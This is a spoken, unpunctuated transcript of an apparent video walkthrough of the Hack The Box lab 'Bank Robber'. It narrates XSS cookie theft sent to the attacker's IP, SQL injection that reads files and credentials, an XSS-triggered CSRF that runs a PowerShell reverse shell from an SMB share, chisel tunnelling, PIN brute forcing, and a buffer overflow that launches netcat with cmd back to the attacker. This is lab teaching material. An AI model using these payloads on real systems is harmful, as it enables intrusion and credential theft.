 what's going on youtube this is ipsec we're doing bank robber from hack the box which involves a lot of cross-site scripting the first is to use crosstalk scripting to steal administrative cookies to a web application then when you log into that you see there's two functions the first one is search which lets you search users it's sql injectable so you can leak source code and the second one lets you execute commands unfortunately when you try to do that it's only accessible from localhost so you revisit that cross-site scripting and stepped instead of stealing cookies you do a cross-site request forgery attack to have that administrator execute that backdoor checker function that lets you execute code in the box you get a reverse shell and you get on the box after poking around you see there is a unique port port 910 listening you use a program like chisel to forward that port back to your box and you see it's a custom application you do some light fuzzing and notice there's a way to trick this application into executing code and that's it so with all that being said let's get started as always the first thing we do is then map the box with dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directly and call it bank robber and then the ip address which is 10 10 10 154 can take some time to run so i've already ran it looking at the results we have quite a few ports open the first one being http on port 80 and its banner tells us it's apache hdbd on the windows platform at 64-bit with the modules open ssl and php loaded so this is a little bit unique because normally on a windows web server you're used to seeing iis this has apache so i'm just going to create a note that says web server is running apache and generally when you see apache on windows it's installed with xampp and i'm just bringing a question mark there because we haven't verified that and xampp is just a free and open source cross-platform web service solution by apache so it installs it's essentially lamp on linux installs apache mariadb php and just makes it so much easier so it's probably installed with that which would mean instead of placing documents and i think c colon inept pub htdocs you place them into c colon xampp htdocs i think so we can always just google xampp default location dub dub dub and let's see does it say it quickly um we'll play around later on the box once we get there if we do but i'm pretty sure that is correct and also probably going to be dot php not dot asp or aspx so that's what we can take from the note so far the next thing we have is ssl is listening on 443 the same exact banner and the certificate just says localhost we can double check to make sure there's no other names by just going to the page so https 10 10 10 154 and if we click on advanced view certificate go through the details and just step through this maybe there's like an email address or something that leaks important information don't see anything the cn just says localhost so nothing too important there you can accept the risk continue to the website and you just see this so we could poke around here but i always like finishing enumeration before i move on we have 445 open saying it's probably windows 7 to windows 10 where group is work group and then we also have uh mysql exposed the host it's telling is bank robber i'm not actually sure where it saw this maybe it is from 445 let's see do i have crack map exec installed uh i do not [Music] let's see let's just try app search pack map exec is it easy to install i have to install alt period to do the last argument and let's install this because i'm really curious how it gets the host name of bank robber because it's not telling us that so i guess while that goes we can rerun this nmap command or never mind crack map exec smb 10 10 10 154 are you going to tell me the host name okay so it does it's probably leaked through um 445. so that's probably how map got it it's not too clear but oh well let's just move on and poke at the website after we do smb client dash capital l 10 10 10 154 just see if there's any anonymous shares open does not look like also going to do a dash capital n nope so let's just move on and poke at the website so going over here we can click on buy ecoin but it just if you look at the bottom left directs us to the top of the page we can try logging in we can try like admin admin submit query doesn't work we could try a few other things and looking at the page it's index.php so i always like having some type of recon going on in the background so i'm going to run girlbuster x php to do the php arguments dash u for url http 101010 154 and dash w4 list user share word list dirt buster then directory list 2 3 medium dot text and dash o for out file go buster dash root and we have to put this in dir mode for directory brute forcing so that's just going to list all the potential pages and now let's register so i'm going to register with the username ip and the password of please subscribe and that is small font but you can see it there and for some reason the password field is not masking the characters but we'll just ignore that so click register and we have message equals user created um user created okay so first thing i'm going to do is put some tags in here we see this in bold we don't so i was just testing for like cross-site scripting whenever i see a message in the url and gets directed on a page like that i always test for reflective cross-site scripting if this message is in bold then we know it works but if we look at this it uses um html entities so the actual carrots are in html entity form which is safe so that's good let's just move on and log in so if please subscribe and we are logged in i see a dead image icon so i want to see where this is right click copy link location and that image is going to index.html so i'm also going to i guess inspect the element to see what it is i think i just pressed f12 everything's on like muscle memory and we see image logo.php so i was looking for if it had like a hostname if it was an absolute url and did like http colon slash bankrobler slash image logo jpeg and maybe that's why it didn't load but no that's not the case and we can check this one as well nope so let's just try transferring some money so amount let's do leet id of addressee let's do one and we'll say you've got money kind of like the old aol you've got mail but you've got money so clicking transfer it says transfer and hold and admin will review it within a minute after that he will decide whether the transaction will be dropped or not so when i see that it looks like there's going to be some type of interaction because it said an admin will review it so let's set up a cross-site scripting so i'm going to do image source equals http 10 10 14 2 slash please subscribe dot jpeg and it may need me in quotes it may not i don't think it does so it's going to create a new window nclvnp 80 and that's going to let us see everything about his browser so let's just do this transfer and i'm just going to go in my notes xss payloads i'm going to put this one and i'm just going to look at real quick image source that should be fine and i'm going to give it a few minutes so what i'm going to do is i'm going to do sleep let's say five minutes so 300 and pause the video and we'll resume it after this leap is done the sleep isn't done but we did get a request from 10 10 10 154 getting that image and we can see the user agents mozilla phantomjs safari 538 so it looks like we do have some type of cross site scripting so the very first thing i'm going to do is inspect how my cookies are stored because this is going to tell me how i do my cross-site scripting payload so press f12 again go to storage and we can look at our cookies if we look at password we see it's just base64 and http only is set to false so i'm going to copy this value real quick this base64 and let's just echo and see what this is so echo base64-d please subscribe so the cookies themselves are just the credentials and http only is not set to false or not set to true so we can probably do cross-site scripting steal cookie um let's just do this payload all the things let's see if it's in here uh payload all the things github there we go if not i'll just write it from memory but i always like showing places i go to find information so let's see crowd site scripting i guess html applications now let's see document.cookie script i guess we can try this i don't know if that'll work but might as well try it and let's send this over to burp suite so let's see burp suite target proxy intercept on transfer okay okay wait that's my portal then send it to me transfer ecoin okay how do i disable this portal um stop it is it about config except portal captive portal disabled okay i think that's it let's just do http instead of https okay i guess we can try this now one one intercept is on transfer ecoin we can unurial encode this to look at it we want to send this location to be 10 10 14 2 and just say cookie is equal to document.cookie one thing i like doing is converting this to base64 just in case there's any weird special characters that would break the url parameter and in javascript b2a is how you convert it to base64 so send this to repeater and we can do our netcat again just send it again in case it was instant and we can start our sleep on 300 and while that goes let's look at a different way to do cross-site scripting so this worked we're testing and is there another payload all the things thing we can look at uh search for on air there we go that's a javascript key log there we go this is what i want image source on air so this is just displaying something we want to send something so let's just copy this and the other way we can do it is image source is equal to x then on error equals this dot src equals the url so we can just do this and then question mark because after the url you do question mark for arguments c is equal to plus b to a document.cookie that's not the exact payload i used oh well that should be fine don't have anything there and because we're testing multiple payloads i'm going to whoops do python dash m simple http server on 80. we don't need to see anything other than url so instead of doing like netcat i guess i could do dash k i think to keep open so we see them all but i'm not interested in the like verbosity of seeing an entire request so let's go back to pip suite paste this one i did ctrl u and we'll say this one's going to be cookie so all i changed was the question mark c to question mark cookie because i want to know if it's this payload that hit or the previous payload that hit so do this send and then let's renew or sleep five minutes and wait so it probably took around three or four minutes and we got the response back so before i do anything else let's just log the payload we had working because nothing's worse than forgetting your cross-state scripting payloads so i'm just going to copy this and we can just say this worked as well we didn't get the question mark c only the cookie so that very first one we did doesn't appear to be working so let's just copy this echo dash n paste base64-d and then we can do the username percent 3d is just an equal sign so let's do echo dash n base64-d and maybe echo maybe doesn't want that dash n oh i didn't put the equals there we go but you're saying it did say admin so there's that this one has two equals so echo dash n base64-d and the password is hopeless romantic so let's go take a look at what happens when we log in so let's go here we can log out probably have to disable burp and we can log in with admin and hopeless romantic i think i missed type that type of that yep let's do admin hopeless romantic there we go so looking at the top we have a few things there is security which is going to this backdoor checker and it's saying um to quickly identify backdoors locator and server we implement this function for safety issues you're only allowed to use the dir command with any arguments so i'm going to try doing what it says run dia and it says it's only allowed from localhost this is due a recent attempt to hacker server so the backdoor checker is only accessible from localhost and this is probably backdoor checker.php let's go see exactly what this is so if we go back to burp http history and we can look at this it's doing a post to slash admin slash backdoor checker dot php so let's do admin slash backdoor checker.php okay let's move on to the next thing we got search users and it wants an id so if i do one i get admin if i do two i get gio we can do a single quote in here we get there's a problem with your sql syntax i'm gonna do dash dashbase dash which is a comment and mysql and it works so looking at this admin search.php this is definitely injectable so what i'm going to do is let's get a legitimate query go back to burp and let's run sql map while we look at the rest of this because again always want some type of recon going in the background so right click copy to file i'm going to say search dot request and then we can go back here um we can look at go bus to see what it says still running probably don't need it anymore so we can just kill that do a ls sko map dash for request search dash request we can do dbms mysql because we know it's mysql and dash technique is equal to union let's just verify union works real quick sent to repeater and we can do order by and this is going to identify how many um columns it's extracting so order by one nothing two three and four we get an error so we know because three is the highest number that worked um there's going to be three columns so now we can do union select one two three and verify this is union injectable we get one two and there's no three and if you did one two you'll get error and sql if you do four things you get another issue so let's run sql map technique u and i'm gonna do dash dash dump okay i think there's a dash dash batch as well so it doesn't ask us any questions there we go so it's just gonna keep going down we can take a look at transactions this looks like transactions waiting for approval so that's where the cross-site scripting thing happens i bet if i refresh this page that'll probably be gone because it's been quite a while let's do proxy intercept off yeah so this is just how the crosstalk scripting thing works there's probably an automated thing that takes this and then goes to a page to get executed but let's look at notes.txt move all files from the default xampp folder so this is definitely now confirmed installed with that application encode comments for every ip address except localhost and take a break so nothing really interesting in the comments but let's look at what information we have dumped so we have balance of every account and then we have a few users ipsec and ip has a password please subscribe so this database isn't doing any hashing so what we probably should do is go here and do creds admin this and then gio gio always take a note of all the creds you get and then you can also do a dash dash users i think in sql map and this will dump the users which is here maybe if i don't do batch let's see help dash dash passwords because i honestly don't really care about knowing all the users i guess if i saw one that wasn't at localhost um if you don't know mysql the usernames also take where they can log in from so i think it's percent is wildcard so if you saw like root at percent that mean root can log in from anywhere but this is just saying root can log in from localhost all this being said we want the password hash because that password may be reused maybe if we got the password we can then log in through smb or something so do you want to store the temporary file no i'm going to do node to dictionary attack and we get the password hash so um this one if you do hash example hashes and pipe this to less mysql you can see this is probably going to be mode 300 but i'm pretty certain it's not going to crack so um i'm not going to bother right now so we have that and this is about all we can get from the database there's a few pieces of information i kind of want to know so let's do some manual queries anything we put at one or two will be displayed back to us so if i do support me on patreon where two is you can see it gets placed there so what i want to know is the um user so i'm going to do user parentheses and we see that's root at localhost i'm going to try system underscore user i think and this is also saying root at localhost i was trying to identify who i am if this was a um microsoft sql server i try a bunch of things like xp cmd exec to execute code or different ways to request a file off a file shared to steal the hash of the user connecting but it doesn't look like it is it's definitely mysql which doesn't support those things that being said mysql does support reading files so we can do select load i think underscore file and then c colon windows system32 license.otf let's see if this works send and we get the file so we definitely can get files and i want to get a file i want to see how this backdoor checker is to see if there's a way we can get bypass this um localhost thing so what i'm going to do is we'll do load file c colon backslash actually before we do that let's do at data dir and this will tell us where the data directory is so it's in c colon backslash xampp slash mysql so if we go back let's try sequel and xampp backslash htdocs backslash index.php let's see if we get this file back and it looks like we do so let's see is there anything here username password let's see using equals admin nothing too important there but we can do slash admin slash backdoor checker dot php and see what this code is so we have an include statement let's just copy this and make dur src admin v backdoor checker dot php uh we probably colon set paste send and paste mode and then let's re-edit this we can do php there we go so now we have syntax highlighting it's a bit annoying that we have all these line breaks but oh well so let's see i'm going to look at what auth and link.php is real quick so c colon admin auth.php see what this is so get username get password if the username is not this kill the page so this is preventing us from accessing backdoor tracker backdoor checker without a valid username because it's going to load the script and then this checks going to fail and then it's not going to execute the rest of the script the other one was linked.php so let's go see what this is and we have user root password welcome one so this is probably going to be that mysql password we saw so we can do this there we go and going back to this source code this is the backdoor checker.php we'll see how it works so the checking the username and password again despite it already being done this auth.php thing but oh well so if is set post cmd fail to escape bad characters so let's see if string position post cmd is equal to anything in care so let's see where is care for bad ass car so bad is going to be the um dollar open and and sign and if it's windows good is okay so the bad characters are this and this so we can probably execute code with the pipe to chain commands and if this was on linux you can use backticks to get around that one so there's definitely ways to go around this because they're not doing sufficient bad character checking so let's see check if the first two characters are ls so if substring post cmd is equal to good and we look at good good is ls but if we're on windows good is equal to dir so our ls we can say linux or dir windows so we're just going to make sure the beginning of the thing is dir and then we have if server remote address is equal to localhost do this so it does three checks bad characters dir and remote address so probably didn't need to read the source to understand it we could have got lucky with fuzzing but because it takes like five minutes for every cross-site scripting thing to work it's nice knowing everything ahead of time so we need to save that and look at the request to send this so we have burp and going to the proxy intercept intercept on and this is the request we send so super easy the one thing i want to do let's just go up to directories make dirt dub dub dub go in www and i'm going to do my uh crosstalk scripting payload in this directory and then we'll send it over with a script tag so if you watch the holiday video this is essentially the same thing so we'll call this please sub.js and ver xhr is equal to new xml http request and i don't like capitalizing all that there we go and then ver url is equal to http localhost admin backdoor checker.php so what i'm doing here actually is creating a payload that instead of doing that um cross-site scripting to send a get request it's going to do a cross-site scripting to send a post request to itself on this command so hopefully that it'll probably make sense once it's done being written but verb params is equal to uh cmd is equal to dir ping i always do this so linux uses dash n i think all right linux uses dash c and windows uses dash n so dash and one 10 10 14 2 one of these days i'll actually remember that i don't know why i just can't so we're going to do this xml request dot open post and the url so this is going to create that xml request the next thing we need to do is set our header so request header and this is going to be content type and application x www form url encoded okay i was just looking here this is the thing i want to set and then xh er with credentials equals true this line is going to send the existing cookies that the web browser knows about and then we can do xhr dot send params okay that should be good python m simple http server on port 80 already in use let's go here kill that start it here and then we can go back here and it looks like i have to create a or i probably don't i go to repeater one and type it here so this one i'm just going to do script src is equal to http 10 10 14 2 slash please sub dot js slash script ctrl u to encode this and then we will send it and if we look here it's probably going to burp we can see it's waiting to be approved so i'm just going to do sleep 300 again and actually we have to do tcp dump dash i ton0 icmp so we can see the actual ping work so this is going to confirm the code execution so now we can just wait and see if this all works so i'm going to wait five minutes and hope for the best and that was actually almost instantly probably like 15 seconds after i paused the video we got the request so that's definitely very good for us and now we just have to get a shell so we can replay the same exact request we just have to edit this and that's why i like doing it this way where we have the cross-site scripting payload send the request to us and we load the rest because we just save a piece that we know works so we could do powershell so let's do powershell dash what's the bypass flag exec exact bypass dash f to run a file and we can run it against a share in our box so 10 10 14 2 please subscribe and we'll call this uh nashang.ps1 that should work and now we just do nclvnp9001 and then cp user share machine shells invoke powershell tcp dot ps1 to dub dub dub slash nashang.ps1 is that what i called it cat please sub nashang.ps1 yep okay and all we do is take this example for reverse put it at the bottom and do 10 10 14 2 port 9001 okay go back to repeater send and we're at it we can double click up here and this will be csrf this one is sql inject and this we don't need anymore okay and one of the things instead of just waiting if you want to use your time wisely you can just start taking screenshots so i think ctrl shift f4 and then we can go this copy actually for a previous screenshot i want that on one line and copy this go to cherrytree screenshots um this will be xss load paste and it's always good to have as many screenshots as you want so slash please sub take this and take this screenshot so generally that's what i'd be doing while i'm waiting for things if i was actually working right now but i was hoping it would do the request while i was doing that and i won't have to pause the video but yeah i'm going to pause the video and we will just wait for oh there we go it hit so we've got please sub dot js and i was an idiot uh cdw um yeah m packet smb server um less so for some reason i was thinking i was doing an iex which loads it off the web server but i decided to change it up and execute a file and we didn't start a smb server so impact smb server the share name which is please subscribe and then the location which we'll just do pwd and then i want to do smb2 support i think it's dash dash nope just one dash okay now let's redo this so we probably could do the ix but later on i just always like having a share drive where i can just copy files tooth to and from the server quickly and yeah so now i'm going to wait five minutes so after a few minutes we did get a hit back and we have bank robber slash the user corton so we can copy this whole thing and let's just save this because this is going to be another hash we could potentially crack in the future so creds um this will be probably ntlm v2 maybe forget the type off top my head but there's that um yeah so now that we're on this box as corton we can do uh who am i slash all and look at the tokens we have if we had the sem impersonation token we'd probably do like juicy potato or something um xbox is in a different language so this is probably administrators what is that so let's see dutch so uh notes local language equals dutch and this would be important if we're doing any type of cracking or things because if the language is not english maybe an english word list may not make sense so let's just move on to other things on this box we can do net use z colon 10 10 14 2 please subscribe and if we go to z uh net use let's do y colon maybe that um drive letters in use uh the term use let's do new ps drive new ps drive see what the syntax is here dash name ipsec and then where's location ps provider and root let's do 10 10 14 2. please subscribe cd and there we go so for some reason the powershell probably had some type of alias set for net so net use was not the net use i was expecting but we got the file here so now we can do cd opt privilege escalation awesome sweet do i not have it there we go cd win p's win ps exe win peace ben x64 release and cp this into hdb boxes bank robber and i was lazy and didn't create a smb directory my s b shares out of dub dub dub but now we have it here so we can just do win ps dot exe and then cmd so this should execute pretty much what um lin p's is or if you haven't watched recent videos it's just a privilege escalation script to do a bunch of things sometimes you get responses back in color on windows sometimes you don't so when it's in color it makes the box a lot easier but i'm just going to wait a few minutes for this to run and then we will resume and if you want to know all the commands if you just google uh win ps github you can look at it let's see win pzxe and it gives you all the syntax so i did cmd to do all checks so there we go it's done so looking at auto run applications uh probably not that important because well we're not rebooting the box installed applications via the registry mozilla this is probably to do that um cross-site scripting thing xampp so nothing out ordinary there installed applications looks like everything's pretty standard current active windows uh [Applause] don't understand it's in german i i think it being a different language is breaking some of the things because it's probably like doing some type of regular expression and then something happens so weird processes non-microsoft mysql xmpp win ps users admin and corton so i'm not going to use the script instead we're just going to poke around the box manually oh we got bankv2.exe can we copy this bankv2.exe uh ipsec i'm guessing we only have whatever a is we don't have um read on this because this is a permission denied but that is definitely interesting we should take a look at task list to see if that's running we can look at quarton desktop that's user.txt so let's do task list slash v for verbose and see what bank v2 is so that's the process see i'm going to search for bank v2 my whole history to see if windpeas said anything about it and it did not so the other thing we can do is netstat a n and look at open ports to see if there's anything just listing on localhost so let's see 80 is the web 135 and 445 is sambar smb 443 is https 910 so we've got something listening on 910 it's saying it's listing on all interfaces but we can't access it so this is definitely going to be probably where we should look at so let's go back into our ipsec drive and run chisel to for that port back to us so just go github chisel to download it we could build it from source or just go to the web page and go to releases and download the ones we want so we want linux because we're on linux so we need to run it there and we want windows so let's go into dub dub dub and then copy the two things here so copy um downloads star.gz here cp oh we can do mv and then gunzip dash d chisel do um unzip it i didn't know a good word to say that uh uncompress so chisel linux amd64 let's do sage mod plus x and then i'm going to move this one to be just uh chisel.exe so it's easier to type so chisel linux and we want to do server we'll do port we're using 9001 so i'll do 9002 and dash reverse to enable reverse shells or reverse tunnels and if this part doesn't make sense to you watch the reddish video because that's why i go over chisel most in depth so we want to do dot slash chisel dot exe client 10 10 14 2 9002 to connect to us and then the syntax are for reverse uh tunnel port 9010 and goes to 12701 910 okay and let's see if it executes come on maybe going a bit slow because it's over this smb so 10 10 14 2 that syntax is right ss ln pt grab 910 so we're just waiting for this to give us a shell nc lvnp 9001 oh wait we got a request back okay but looks like chisel has took over my um command so i can't run other commands so should get another shell briefly but while we do we can now do that ssl np and we see we're now listening on port 910 so if i do nmap dash sc dash sv dash n for no dns uh we can that should be fine uh localhost 910 so should we get a response back and while that runs we can do nc localhost 910 to see what this port is so internet ecoin transfer system please enter your super secret four digit pin to log in one two three four is always a safe bet access denied um four zeros access denied looking at this i didn't do dash p that's what i was missing p910 but and matt's probably not gonna be that much of a help because we see this is a custom application this is probably the bank v2.exe i guess we have to write a brute force so to get into this so v brute dot pi let me do from pwn import star for i and range 0 to quad 9s and we'll do code is equal to i dot z fill four and all that's going to do is do padding so it's always four characters so if i do uh pip3 install pen tools because i didn't have it on this version of cali there we go now that parent tool is installed we can run this and object has no attribute z fill let's do it's weird um pen is equal to str i then dot z fill there we go so if we do a head we can see that a loop with just one it puts three zeros if you look at this it would do two zeros before ten so that just does the padding so there's that then we need r is equal to remote localhost port 9010 so we're connecting to ourselves which then goes through a tunnel and then our dot receive until ncl uh localhost 910 we want that okay and then r dot send line code and then response is equal to r dot receive line and we'll close the socket if access denied not in response print code break python 3 root bytes like object not string on line 10. if i do b okay and it stopped at zero zero two one zero zero two one pin is correct enter the amount of e coins you like to transfer let's do one transferring one coin to our application executing e ecoin transfer tool c colon users admin document transfer.exe so let's see if we can copy this file uh didn't send us a shell that was rude oh her nmap connected to us darn it all right matt beat the thing we can disconnect zero zero two one let's send it um 100 days python dash c print a times 100 to see what happens 0021 and we get executing transfer tool and it just straight a's so if we do a times 32 let's see what happens actually before we do 32 for a's it's still doing transfer.exe 32 we're not doing anything did i just guess that number 42 0021 yeah so after 32 it looks like it erases the buffer so um the way i would normally do this is locate pattern create and then we'd run this and what is it dash l 100 and once this actually loads we could copy the string so we could copy this 0021 paste and then copy a few things and instead of pattern create it would be pattern offset and we do dash q and dash l 100 so this will probably tell us at 32 it's when it repeats uh zero ab1 32 so it just didn't like it being this long string but there we go at byte 32 and that string it erases so what we can do is let's see if we go to dub dub dub cat please sub dot js let's see how long this is this looks like it's over 32 characters echo wc-c 73 so chances are we don't want to use this 57 37. so this is probably going to be a no-go just because of how long it is that being said we can execute anything so we can just create an executable so do we have a shell yet we do not why do we not get a shell has it not been five minutes so let's see i guess we can just download netcat so netcat x64 windows and go download this small update get one one two save and then cp downloads what's the file name uh netcat here unzip it nc64.exe so let's do zero two one we gotta do 32 a's so python dash c print a times 32 and we can do that 10 10 14 two um or redo or share i just killed chisel okay it restarted sweet share we'll just do p and then nc 64.e and we want to do what are the options think dash e cmd 10 10 14 2 9 000 1. i would do 9003 so we can copy this v021 paste and it's executing 10 10 14 2 pnc64.exe doesn't look like we got a hit back and doesn't look like anything talk to our smb server so maybe it doesn't want four slashes 021 paste this it's doing something connection reset authenticated and then something weird happened let's just try moving the dash e option to the other side dash e should execute something actually let's not even try executing something let's just connect to the socket so let's copy this and see if this works so copy then 0021 paste and of course we would have got a shell but we renamed our share so the please subscribe thing didn't get executed so let's dub dub dub please subscribe.js and change this to just slash p as a reminder we had changed that because we have 32 bytes we can work with in our payload so we wanted to make sure we fit it so send this request in and in five minutes we'll probably get a shell we can disconnect dash e cmd i'm really not sure why this isn't working ah we need to use the o21 paste oh it's back to four do one copy co21 paste authenticated but did not execute it let's get rid of the ecmd so this should just connect straight to us 2 1 paste nothing we got a shell so what i'm going to do can we see the ipsec still um new ps drive dash what is the syntax dash name p dash we can just copy paste nope dash ps provider file system dash root 10 10 14 2 p we're missing something i don't know what we're missing new ps drive dash name yep i don't want to use ipsec because we already used it so copy dash paste we can do 10 10 14 2 p there we go must have had a bad character or something so now we should be able to test our nc64 payload so if i copy paste should take a second to load well it connected i'm not sure why it sent what it did but netcat's definitely working so let's try copying nc64.exe to c colon um users corbin is that the name cd users here go to c colon c colon cd users corten copy zcolonnc64.exe to n.exe copy yep nc64.exe to n.exe dir okay so let's instead of doing this unc path c colon backslash users core 10 n.exe 10 10 14 2 9003 ecmd and we'll hope this works zero two one paste and there we go so for some reason that just didn't like executing off of um the file share but cd backslash users administrator desktop path didn't exist cd users administrator admin desktop and we can get root.text so that is the box hope you guys enjoyed it take care and i'll see you all next week there's administrator desktop path in exist cd users administrator admin desktop and we can get root.text so that is the box hope you guys enjoyed it take care and i'll see you all next week